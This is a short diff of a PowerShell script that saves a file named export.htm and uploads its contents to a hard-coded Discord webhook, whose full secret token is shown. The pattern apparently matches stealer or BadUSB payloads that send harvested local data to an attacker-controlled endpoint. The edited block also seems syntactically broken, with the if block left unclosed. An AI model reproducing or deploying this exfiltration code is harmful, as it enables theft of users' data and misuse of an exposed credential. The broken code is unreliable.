@@ -49,10 +49,9 @@ $savePath = "C:\temp\export.htm"
 Start-Sleep -Seconds 3
 
 if (Test-Path $filePath) {
-    $file = Get-Item $filePath
-    $webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = $file }
-} else {
-    Write-Host "File not found: $filePath"
+$webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
+$body = @{
+    file1 = Get-Content -Path 'export.htm' -Raw
 }
 
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body
